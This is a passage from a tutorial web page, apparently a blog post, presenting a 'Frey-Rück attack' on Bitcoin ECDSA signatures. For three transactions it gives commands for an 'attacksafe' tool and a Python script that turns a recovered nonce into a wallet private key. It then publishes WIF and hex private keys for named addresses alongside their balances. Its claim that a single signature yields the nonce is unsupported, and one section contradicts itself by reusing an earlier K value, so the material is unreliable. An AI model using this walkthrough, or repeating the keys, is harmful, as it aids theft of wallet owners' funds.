<hr class="wp-block-separator has-alpha-channel-opacity">



<p>To get the secret key from a vulnerable ECDSA signing transaction, let’s add the data&nbsp;<code>RawTX</code>to a text document and save it as a file<code>RawTX.txt</code></p>



<pre class="wp-block-code"><code>01000000011c2b74d4b3ccdd96201841bce8931efa4b40c0dcd11ce52bafe3167bc5c7f741120000006b483045022003af10d2cd5db13bacedc903c00a76d93d1e1749fff30d030bdf13ead615e644022100a66c5b518e61b1dd3b9e27068bcd5286d32690023fa69b845972e4b09800ac8a012103f3b587144f038f7fd504eaebb2159ad97c0ca33c3cbaf7f3899849a9e2c9074bffffffff010000000000000000046a02585800000000</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Launch&nbsp;<code>-tool frey_ruck_attack</code>using software<code>“ATTACKSAFE SOFTWARE”</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>./attacksafe -tool frey_ruck_attack -open RawTX.txt -save SecretKey.txt</code></pre>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-49-1024x318.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-980"></figure>



<p>We launched this attack from&nbsp;<code>-tool frey_ruck_attack</code>and the result was saved to a file<code>SecretKey.txt</code></p>



<p>Now to see the successful result, open the file<code>SecretKey.txt</code></p>



<pre class="wp-block-code"><code>cat SecretKey.txt</code></pre>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-51-1024x484.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-986"></figure>



<pre class="wp-block-code"><code>Deployments ECDSA:

SecretKey = 0x80ae47bd5353515bc5c39bad5a9ac124b0be808260bbaf1cda1458a078f0c226

RawTX = 01000000011c2b74d4b3ccdd96201841bce8931efa4b40c0dcd11ce52bafe3167bc5c7f741120000006b483045022003af10d2cd5db13bacedc903c00a76d93d1e1749fff30d030bdf13ead615e644022100a66c5b518e61b1dd3b9e27068bcd5286d32690023fa69b845972e4b09800ac8a012103f3b587144f038f7fd504eaebb2159ad97c0ca33c3cbaf7f3899849a9e2c9074bffffffff010000000000000000046a02585800000000</code></pre>



<p>We see an inscription&nbsp;<code>"Deployments ECDSA"</code>that means a critical vulnerability in the Bitcoin blockchain transaction.</p>



<p><code>SecretKey value in HEX format, this is our secret key "K" (NONCE):</code></p>



<p><code>K = 0x80ae47bd5353515bc5c39bad5a9ac124b0be808260bbaf1cda1458a078f0c226</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s check with a&nbsp;<em>Python</em>&nbsp;script<code>point2gen.py</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><a href="https://pypi.org/project/ECPy/" target="_blank" rel="noreferrer noopener"><strong>Let’s use the ECPy</strong></a>&nbsp;elliptic curve library&nbsp;:</p>



<p>Now let’s run the script by specifying&nbsp;<code>secret key "K" (NONCE)</code>:</p>



<pre class="wp-block-code"><code>python3 point2gen.py 0x80ae47bd5353515bc5c39bad5a9ac124b0be808260bbaf1cda1458a078f0c226</code></pre>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-52-1024x93.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-989"></figure>



<p><code>(0x03af10d2cd5db13bacedc903c00a76d93d1e1749fff30d030bdf13ead615e644 , 0xa60ac25dfd96acce7456b5c16c8fcc5330988769558c09d36bf12ce2a9d369fc)</code></p>



<p>Checking the coordinates of a point&nbsp;<code>EC (secp256k1)&nbsp;</code>with a signature value<code>R</code></p>



<pre class="wp-block-code"><code>R = 0x03af10d2cd5db13bacedc903c00a76d93d1e1749fff30d030bdf13ead615e644
S = 0xa66c5b518e61b1dd3b9e27068bcd5286d32690023fa69b845972e4b09800ac8a
Z = 0xb6d536f025718d424e97ea40e0a86eb32f3f7d3673c4d0decb1a71466235d4de</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>R          =    0x03af10d2cd5db13bacedc903c00a76d93d1e1749fff30d030bdf13ead615e644
point2gen  =   (0x03af10d2cd5db13bacedc903c00a76d93d1e1749fff30d030bdf13ead615e644 , 0xa60ac25dfd96acce7456b5c16c8fcc5330988769558c09d36bf12ce2a9d369fc)
</code></pre>



<p><code>ALL CORRECT!</code></p>



<p><code>K = 0x80ae47bd5353515bc5c39bad5a9ac124b0be808260bbaf1cda1458a078f0c226</code></p>



<p>Now knowing the secret key, we can get the private key to the Bitcoin Wallet:<code>16DCNX182FdnKxsDqNt4k6AMZGb1BHDzgG</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s use&nbsp; the&nbsp;<em>Python</em>&nbsp;script:&nbsp;&nbsp;<code>calculate.py</code>&nbsp;&gt; &gt; &gt; Get the Private Key</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Let’s open the code and add all the value of the signatures<code><strong>K, R, S, Z</strong></code></p>



<pre class="wp-block-code"><code>def h(n):
    return hex(n).replace("0x","")

def extended_gcd(aa, bb):
    lastremainder, remainder = abs(aa), abs(bb)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient*x, x
        y, lasty = lasty - quotient*y, y
    return lastremainder, lastx * (-1 if aa &lt; 0 else 1), lasty * (-1 if bb &lt; 0 else 1)

def modinv(a, m):
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise ValueError
    return x % m
    
N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141


K = 0x80ae47bd5353515bc5c39bad5a9ac124b0be808260bbaf1cda1458a078f0c226
R = 0x03af10d2cd5db13bacedc903c00a76d93d1e1749fff30d030bdf13ead615e644
S = 0xa66c5b518e61b1dd3b9e27068bcd5286d32690023fa69b845972e4b09800ac8a
Z = 0xb6d536f025718d424e97ea40e0a86eb32f3f7d3673c4d0decb1a71466235d4de


print (h((((S * K) - Z) * modinv(R,N)) % N))</code></pre>



<h2>The script will calculate the private key using the formula:</h2>



<p><code>Privkey = ((((S * K) - Z) * modinv(R,N)) % N)</code></p>



<p>Let’s run the script:</p>



<pre class="wp-block-code"><code>python3 calculate.py</code></pre>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-53.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-991"></figure>



<p><code>PrivKey = 4faa01f7409813181fb5ae8d352796b791cd9df4ba0650df7008f5d9d6be8766</code></p>



<p><strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">Let’s open bitaddress</a></strong>&nbsp;and&nbsp;check:</p>



<pre class="wp-block-code"><code>ADDR: 16DCNX182FdnKxsDqNt4k6AMZGb1BHDzgG
WIF:  KytZsDHWSqKo9YuWTxwmM5D4g511TsLubF3pF7WgXfg3MTG1GfKa
HEX:  4faa01f7409813181fb5ae8d352796b791cd9df4ba0650df7008f5d9d6be8766</code></pre>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/002.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-755"></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><a href="https://www.blockchain.com/btc/address/16DCNX182FdnKxsDqNt4k6AMZGb1BHDzgG">https://www.blockchain.com/btc/address/16DCNX182FdnKxsDqNt4k6AMZGb1BHDzgG</a></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><code>Private Key Found!</code></p>



<figure class="wp-block-image"><a href="https://www.blockchain.com/btc/address/16DCNX182FdnKxsDqNt4k6AMZGb1BHDzgG" target="_blank" rel="noreferrer noopener"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-16-1024x449.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-781"></a><figcaption><code><strong>www.blockchain.com/btc/address/16DCNX182FdnKxsDqNt4k6AMZGb1BHDzgG</strong></code></figcaption></figure>



<p><code>BALANCE: $ 711.37</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><strong><code>№2</code></strong></p>



<p>With detailed cryptanalysis, we also found a critical vulnerability in Bitcoin Address:</p>



<blockquote class="wp-block-quote"><p><strong><a href="https://btc.exan.tech/address/1HYDQRwXbvVYpmDn6kGJ6kjyewvtyz1CL5" target="_blank" rel="noreferrer noopener">1HYDQRwXbvVYpmDn6kGJ6kjyewvtyz1CL5</a></strong></p><p><a href="https://btc.exan.tech/tx/fed0b3472341788b58798d6a124a4d0c66c86535ae5f640cb7e5ba0e175665fb" target="_blank" rel="noreferrer noopener">https://btc.exan.tech/tx/fed0b3472341788b58798d6a124a4d0c66c86535ae5f640cb7e5ba0e175665fb</a></p><p><a href="https://btc.exan.tech/tx/e5bb4aba7dc061059ac163e2dd62b4b025454f5db85e4ec65f45edee97d91393" target="_blank" rel="noreferrer noopener">https://btc.exan.tech/tx/e5bb4aba7dc061059ac163e2dd62b4b025454f5db85e4ec65f45edee97d91393</a></p></blockquote>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-3.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-649"></figure>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-4.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-651"></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Prepare RawTX for the attack</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote"><p><strong><a href="https://btc.exan.tech/address/1HYDQRwXbvVYpmDn6kGJ6kjyewvtyz1CL5" target="_blank" rel="noreferrer noopener">1HYDQRwXbvVYpmDn6kGJ6kjyewvtyz1CL5</a></strong></p><p><a href="https://btc.exan.tech/tx/fed0b3472341788b58798d6a124a4d0c66c86535ae5f640cb7e5ba0e175665fb" target="_blank" rel="noreferrer noopener">https://btc.exan.tech/tx/fed0b3472341788b58798d6a124a4d0c66c86535ae5f640cb7e5ba0e175665fb</a></p></blockquote>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-17-1024x91.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-790"></figure>



<pre class="wp-block-code"><code>RawTX = 010000000128231a6d229f0dbea21477c631fd38d8c87159dc59b917bb822c4f593b5fba8e040000006a47304402203458a4ca3bd23a0e255b6c6f579019b1ca112d0f0e2fe4b9635423b9fbee204d0220445065a0df0007cb92c64c775019fb04cfdeb7e5820f61d6b31a52af6e2d091301210273376122cb37be518f8f47085978fda04eb7ced923b00d055b581b6fc2b179ffffffffff010000000000000000046a02585900000000
</code></pre>



<h2>Now we need to get all R, S, Z values ​​from all vulnerable transactions</h2>



<p>Let’s use the breakECDSA.py script</p>



<pre class="wp-block-code"><code>python2 breakECDSA.py 010000000128231a6d229f0dbea21477c631fd38d8c87159dc59b917bb822c4f593b5fba8e040000006a47304402203458a4ca3bd23a0e255b6c6f579019b1ca112d0f0e2fe4b9635423b9fbee204d0220445065a0df0007cb92c64c775019fb04cfdeb7e5820f61d6b31a52af6e2d091301210273376122cb37be518f8f47085978fda04eb7ced923b00d055b581b6fc2b179ffffffffff010000000000000000046a02585900000000
</code></pre>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-54-1024x261.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-994"></figure>



<pre class="wp-block-code"><code>R = 0x3458a4ca3bd23a0e255b6c6f579019b1ca112d0f0e2fe4b9635423b9fbee204d
S = 0x445065a0df0007cb92c64c775019fb04cfdeb7e5820f61d6b31a52af6e2d0913
Z = 0x8b65d49dde9949e5ea18ae637d7f4f48c7c3b38957892a94a3bab994fec4eee7</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>To get the secret key from a vulnerable ECDSA signing transaction, let’s add the data&nbsp;<code>RawTX</code>to a text document and save it as a file<code>RawTX.txt</code></p>



<pre class="wp-block-code"><code>010000000128231a6d229f0dbea21477c631fd38d8c87159dc59b917bb822c4f593b5fba8e040000006a47304402203458a4ca3bd23a0e255b6c6f579019b1ca112d0f0e2fe4b9635423b9fbee204d0220445065a0df0007cb92c64c775019fb04cfdeb7e5820f61d6b31a52af6e2d091301210273376122cb37be518f8f47085978fda04eb7ced923b00d055b581b6fc2b179ffffffffff010000000000000000046a02585900000000</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Launch&nbsp;<code>-tool frey_ruck_attack</code>using software<code>“ATTACKSAFE SOFTWARE”</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>./attacksafe -tool frey_ruck_attack -open RawTX.txt -save SecretKey.txt</code></pre>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-55-1024x313.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-996"></figure>



<p>We launched this attack from&nbsp;<code>-tool frey_ruck_attack</code>and the result was saved to a file<code>SecretKey.txt</code></p>



<p>Now to see the successful result, open the file<code>SecretKey.txt</code></p>



<pre class="wp-block-code"><code>cat SecretKey.txt</code></pre>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-57-1024x466.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-999"></figure>



<pre class="wp-block-code"><code>Deployments ECDSA:

SecretKey = 0xa63d1fe332773809f41bc0d67262088d918a34a71444e30c19424c64b13e6e3c

RawTX = 010000000128231a6d229f0dbea21477c631fd38d8c87159dc59b917bb822c4f593b5fba8e040000006a47304402203458a4ca3bd23a0e255b6c6f579019b1ca112d0f0e2fe4b9635423b9fbee204d0220445065a0df0007cb92c64c775019fb04cfdeb7e5820f61d6b31a52af6e2d091301210273376122cb37be518f8f47085978fda04eb7ced923b00d055b581b6fc2b179ffffffffff010000000000000000046a02585900000000</code></pre>



<p>We see an inscription&nbsp;<code>"Deployments ECDSA"</code>that means a critical vulnerability in the Bitcoin blockchain transaction.</p>



<p><code>SecretKey value in HEX format, this is our secret key "K" (NONCE):</code></p>



<p><code>K = 0xa63d1fe332773809f41bc0d67262088d918a34a71444e30c19424c64b13e6e3c</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s check with a&nbsp;<em>Python</em>&nbsp;script<code>point2gen.py</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><a href="https://pypi.org/project/ECPy/" target="_blank" rel="noreferrer noopener"><strong>Let’s use the ECPy</strong></a>&nbsp;elliptic curve library&nbsp;:</p>



<p>Now let’s run the script by specifying&nbsp;<code>secret key"K" (NONCE)</code>:</p>



<pre class="wp-block-code"><code>python3 point2gen.py 0xa63d1fe332773809f41bc0d67262088d918a34a71444e30c19424c64b13e6e3c</code></pre>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-58-1024x85.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-1003"></figure>



<p><code>(0x3458a4ca3bd23a0e255b6c6f579019b1ca112d0f0e2fe4b9635423b9fbee204d , 0x8d8650fddf514e1263e18650a0e72c08f20eeb3c34ad0dd13b3792b890d3ca44)</code></p>



<p>Checking the coordinates of a point&nbsp;<code>EC (secp256k1)&nbsp;</code>with a signature value<code>R</code></p>



<pre class="wp-block-code"><code>R = 0x3458a4ca3bd23a0e255b6c6f579019b1ca112d0f0e2fe4b9635423b9fbee204d
S = 0x445065a0df0007cb92c64c775019fb04cfdeb7e5820f61d6b31a52af6e2d0913
Z = 0x8b65d49dde9949e5ea18ae637d7f4f48c7c3b38957892a94a3bab994fec4eee7</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>R          =    0x3458a4ca3bd23a0e255b6c6f579019b1ca112d0f0e2fe4b9635423b9fbee204d
point2gen  =   (0x3458a4ca3bd23a0e255b6c6f579019b1ca112d0f0e2fe4b9635423b9fbee204d , 0x8d8650fddf514e1263e18650a0e72c08f20eeb3c34ad0dd13b3792b890d3ca44)
</code></pre>



<p><code>ALL CORRECT!</code></p>



<p><code>K = 0xa63d1fe332773809f41bc0d67262088d918a34a71444e30c19424c64b13e6e3c</code></p>



<p>Now knowing the secret key, we can get the private key to the Bitcoin Wallet:<code>1HYDQRwXbvVYpmDn6kGJ6kjyewvtyz1CL5</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s use&nbsp; the&nbsp;<em>Python</em>&nbsp;script:&nbsp;&nbsp;<code>calculate.py</code>&nbsp;&gt; &gt; &gt; Get the Private Key</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Let’s open the code and add all the value of the signatures<code><strong>K, R, S, Z</strong></code></p>



<pre class="wp-block-code"><code>def h(n):
    return hex(n).replace("0x","")

def extended_gcd(aa, bb):
    lastremainder, remainder = abs(aa), abs(bb)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient*x, x
        y, lasty = lasty - quotient*y, y
    return lastremainder, lastx * (-1 if aa &lt; 0 else 1), lasty * (-1 if bb &lt; 0 else 1)

def modinv(a, m):
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise ValueError
    return x % m
    
N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141


K = 0xa63d1fe332773809f41bc0d67262088d918a34a71444e30c19424c64b13e6e3c
R = 0x3458a4ca3bd23a0e255b6c6f579019b1ca112d0f0e2fe4b9635423b9fbee204d
S = 0x445065a0df0007cb92c64c775019fb04cfdeb7e5820f61d6b31a52af6e2d0913
Z = 0x8b65d49dde9949e5ea18ae637d7f4f48c7c3b38957892a94a3bab994fec4eee7


print (h((((S * K) - Z) * modinv(R,N)) % N))</code></pre>



<h2>The script will calculate the private key using the formula:</h2>



<p><code>Privkey = ((((S * K) - Z) * modinv(R,N)) % N)</code></p>



<p>Let’s run the script:</p>



<pre class="wp-block-code"><code>python3 calculate.py</code></pre>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-59.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-1004"></figure>



<p><code>PrivKey = 4f539d49b23b87697b74e2f508d4260936e5f47856dae5090d4f5bde1b863a82</code></p>



<p><strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">Let’s open bitaddress</a></strong>&nbsp;and&nbsp;check:</p>



<pre class="wp-block-code"><code>ADDR: 1HYDQRwXbvVYpmDn6kGJ6kjyewvtyz1CL5
WIF:  KysupQsbEPB7cEcUwpTpxdCAMTVLa9RjVtSzFZbrRV5pcNe2fk4Q
HEX:  4f539d49b23b87697b74e2f508d4260936e5f47856dae5090d4f5bde1b863a82</code></pre>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/a2.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-824"></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><a href="https://www.blockchain.com/btc/address/1HYDQRwXbvVYpmDn6kGJ6kjyewvtyz1CL5">https://www.blockchain.com/btc/address/1HYDQRwXbvVYpmDn6kGJ6kjyewvtyz1CL5</a></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><code>Private Key Found!</code></p>



<figure class="wp-block-image"><a href="https://www.blockchain.com/btc/address/1HYDQRwXbvVYpmDn6kGJ6kjyewvtyz1CL5" target="_blank" rel="noreferrer noopener"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-18-1024x449.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-802"></a><figcaption><strong><code>www.blockchain.com/btc/address/1HYDQRwXbvVYpmDn6kGJ6kjyewvtyz1CL5</code></strong></figcaption></figure>



<p><code>BALANCE: $ 677.14</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote"><p><em>The potential threat of losing BTC coins lies in the critical vulnerability of the Bitcoin blockchain transaction, so we strongly recommend that everyone always update the software and use only verified devices.</em></p></blockquote>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>With detailed cryptanalysis, we also found a critical vulnerability in&nbsp;<strong><a href="https://btc.exan.tech/tx/e5bb4aba7dc061059ac163e2dd62b4b025454f5db85e4ec65f45edee97d91393" target="_blank" rel="noreferrer noopener">e5bb4aba7dc061059ac163e2dd62b4b025454f5db85e4ec65f45edee97d91393</a></strong>&nbsp;for the same Bitcoin Address<strong><code>&nbsp;TXID:</code></strong><strong><a href="https://btc.exan.tech/tx/e5bb4aba7dc061059ac163e2dd62b4b025454f5db85e4ec65f45edee97d91393" target="_blank" rel="noreferrer noopener"></a></strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Prepare RawTX for the attack</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote"><p><strong><a href="https://btc.exan.tech/address/1HYDQRwXbvVYpmDn6kGJ6kjyewvtyz1CL5" target="_blank" rel="noreferrer noopener">1HYDQRwXbvVYpmDn6kGJ6kjyewvtyz1CL5</a></strong></p><p><a href="https://btc.exan.tech/tx/e5bb4aba7dc061059ac163e2dd62b4b025454f5db85e4ec65f45edee97d91393" target="_blank" rel="noreferrer noopener">https://btc.exan.tech/tx/e5bb4aba7dc061059ac163e2dd62b4b025454f5db85e4ec65f45edee97d91393</a></p></blockquote>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-19-1024x95.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-851"></figure>



<pre class="wp-block-code"><code>RawTX = 01000000015369985c4db3fc4fb6b7671a58f4858a20c11922b8a84cecdefd4687f105362a0e0000006c493046022100cda94253bf560fbb22c5dfd6b6d8d2f58d6401bfdca0a7e1dde84e3b2186b0e8022100ab8ea68d18501eee92408390e9fffd5f5a5b029821f09f4a2914b84ad842897501210273376122cb37be518f8f47085978fda04eb7ced923b00d055b581b6fc2b179ffffffffff010000000000000000046a02585900000000
</code></pre>



<h2>Now we need to get all R, S, Z values ​​from all vulnerable transactions</h2>



<p>Let’s use the breakECDSA.py script</p>



<pre class="wp-block-code"><code>python2 breakECDSA.py 01000000015369985c4db3fc4fb6b7671a58f4858a20c11922b8a84cecdefd4687f105362a0e0000006c493046022100cda94253bf560fbb22c5dfd6b6d8d2f58d6401bfdca0a7e1dde84e3b2186b0e8022100ab8ea68d18501eee92408390e9fffd5f5a5b029821f09f4a2914b84ad842897501210273376122cb37be518f8f47085978fda04eb7ced923b00d055b581b6fc2b179ffffffffff010000000000000000046a02585900000000
</code></pre>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-60-1024x252.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-1006"></figure>



<pre class="wp-block-code"><code>R = 0xcda94253bf560fbb22c5dfd6b6d8d2f58d6401bfdca0a7e1dde84e3b2186b0e8
S = 0xab8ea68d18501eee92408390e9fffd5f5a5b029821f09f4a2914b84ad8428975
Z = 0x9d568564500c4b9911ccd4dbb3865e0c9129f2697e9a710f575c63f5f22753b1</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>To get the secret key from a vulnerable ECDSA signing transaction, let’s add the data&nbsp;<code>RawTX</code>to a text document and save it as a file<code>RawTX.txt</code></p>



<pre class="wp-block-code"><code>01000000015369985c4db3fc4fb6b7671a58f4858a20c11922b8a84cecdefd4687f105362a0e0000006c493046022100cda94253bf560fbb22c5dfd6b6d8d2f58d6401bfdca0a7e1dde84e3b2186b0e8022100ab8ea68d18501eee92408390e9fffd5f5a5b029821f09f4a2914b84ad842897501210273376122cb37be518f8f47085978fda04eb7ced923b00d055b581b6fc2b179ffffffffff010000000000000000046a02585900000000</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Launch&nbsp;<code>-tool frey_ruck_attack</code>using software<code>“ATTACKSAFE SOFTWARE”</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>./attacksafe -tool frey_ruck_attack -open RawTX.txt -save SecretKey.txt</code></pre>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-61-1024x310.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-1008"></figure>



<p>We launched this attack from&nbsp;<code>-tool frey_ruck_attack</code>and the result was saved to a file<code>SecretKey.txt</code></p>



<p>Now to see the successful result, open the file<code>SecretKey.txt</code></p>



<pre class="wp-block-code"><code>cat SecretKey.txt</code></pre>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-62-1024x453.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-1011"></figure>



<pre class="wp-block-code"><code>Deployments ECDSA:

SecretKey = 0xfe150813ba57b990dc7bfacbd3f6c8f6c78a3758789628bdb53808a7fb0d8154

RawTX = 01000000015369985c4db3fc4fb6b7671a58f4858a20c11922b8a84cecdefd4687f105362a0e0000006c493046022100cda94253bf560fbb22c5dfd6b6d8d2f58d6401bfdca0a7e1dde84e3b2186b0e8022100ab8ea68d18501eee92408390e9fffd5f5a5b029821f09f4a2914b84ad842897501210273376122cb37be518f8f47085978fda04eb7ced923b00d055b581b6fc2b179ffffffffff010000000000000000046a02585900000000</code></pre>



<p>We see an inscription&nbsp;<code>"Deployments ECDSA"</code>that means a critical vulnerability in the Bitcoin blockchain transaction.</p>



<p><code>SecretKey value in HEX format, this is our secret key "K" (NONCE):</code></p>



<p><code>K = 0xa63d1fe332773809f41bc0d67262088d918a34a71444e30c19424c64b13e6e3c</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s check with a&nbsp;<em>Python</em>&nbsp;script<code>point2gen.py</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><a href="https://pypi.org/project/ECPy/" target="_blank" rel="noreferrer noopener"><strong>Let’s use the ECPy</strong></a>&nbsp;elliptic curve library&nbsp;:</p>



<p>Now let’s run the script by specifying&nbsp;<code>secret key</code> <code>"K" (NONCE)</code>:</p>



<pre class="wp-block-code"><code>python3 point2gen.py 0xfe150813ba57b990dc7bfacbd3f6c8f6c78a3758789628bdb53808a7fb0d8154</code></pre>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-63-1024x94.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-1015"></figure>



<p><code>(0xcda94253bf560fbb22c5dfd6b6d8d2f58d6401bfdca0a7e1dde84e3b2186b0e8 , 0x8ef495c9057b590ef5437f710ad585bccc4344a48feeeb28c33bff8b7154662)</code></p>



<p>Checking the coordinates of a point&nbsp;<code>EC (secp256k1)&nbsp;</code>with a signature value<code>R</code></p>



<pre class="wp-block-code"><code>R = 0xcda94253bf560fbb22c5dfd6b6d8d2f58d6401bfdca0a7e1dde84e3b2186b0e8
S = 0xab8ea68d18501eee92408390e9fffd5f5a5b029821f09f4a2914b84ad8428975
Z = 0x9d568564500c4b9911ccd4dbb3865e0c9129f2697e9a710f575c63f5f22753b1</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>R          =    0xcda94253bf560fbb22c5dfd6b6d8d2f58d6401bfdca0a7e1dde84e3b2186b0e8
point2gen  =   (0xcda94253bf560fbb22c5dfd6b6d8d2f58d6401bfdca0a7e1dde84e3b2186b0e8 , 0x8ef495c9057b590ef5437f710ad585bccc4344a48feeeb28c33bff8b7154662)
</code></pre>



<p><code>ALL CORRECT!</code></p>



<p><code>K = 0xfe150813ba57b990dc7bfacbd3f6c8f6c78a3758789628bdb53808a7fb0d8154</code></p>



<p>Now knowing the secret key, we can get the private key to the Bitcoin Wallet:<code>1HYDQRwXbvVYpmDn6kGJ6kjyewvtyz1CL5</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s use&nbsp; the&nbsp;<em>Python</em>&nbsp;script:&nbsp;&nbsp;<code>calculate.py</code>&nbsp;&gt; &gt; &gt; Get the Private Key</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Let’s open the code and add all the value of the signatures<code><strong>K, R, S, Z</strong></code></p>



<pre class="wp-block-code"><code>def h(n):
    return hex(n).replace("0x","")

def extended_gcd(aa, bb):
    lastremainder, remainder = abs(aa), abs(bb)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient*x, x
        y, lasty = lasty - quotient*y, y
    return lastremainder, lastx * (-1 if aa &lt; 0 else 1), lasty * (-1 if bb &lt; 0 else 1)

def modinv(a, m):
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise ValueError
    return x % m
    
N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141


